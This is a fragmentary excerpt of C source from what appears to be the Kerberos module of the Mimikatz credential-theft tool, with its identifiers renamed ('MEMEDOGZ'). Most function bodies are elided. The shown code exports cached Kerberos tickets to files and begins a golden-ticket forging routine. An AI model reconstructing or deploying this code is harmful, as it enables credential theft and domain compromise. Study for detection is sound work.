				...
				if(export)
				{
					...
					if(pKerbRetrieveRequest = (PKERB_RETRIEVE_TKT_REQUEST) LocalAlloc(LPTR, szData)) // LPTR implicates KERB_ETYPE_NULL
					{
						...
						if(NT_SUCCESS(status))
						{
							if(NT_SUCCESS(packageStatus))
							{
								if(filename = kuhl_m_kerberos_generateFileName(i, &pKerbCacheResponse->Tickets[i], MEMEDOGZ_KERBEROS_EXT))
								{
		...
		if(pKerbRetrieveRequest = (PKERB_RETRIEVE_TKT_REQUEST) LocalAlloc(LPTR, szData))
		{
			...
			if(NT_SUCCESS(status))
			{
				if(NT_SUCCESS(packageStatus))
				{
					...
					if(isExport)
						filename = kuhl_m_kerberos_generateFileName_short(&ticket, MEMEDOGZ_KERBEROS_EXT);
...
NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
{
	...
	kull_m_string_args_byName(argc, argv, L"ticket", &filename, L"ticket." MEMEDOGZ_KERBEROS_EXT);
	...
	if(NT_SUCCESS(status))
	{
		if(*buffer = (PBYTE) LocalAlloc(LPTR, pCSystem->KeySize))
		{
			*dwBuffer = pCSystem->KeySize;
			status = (MEMEDOGZ_NT_MAJOR_VERSION < 6) ? pCSystem->HashPassword_NT5(pString, *buffer) : pCSystem->HashPassword_NT6(pString, pSalt, count, *buffer);
			if(!NT_SUCCESS(status))
			{
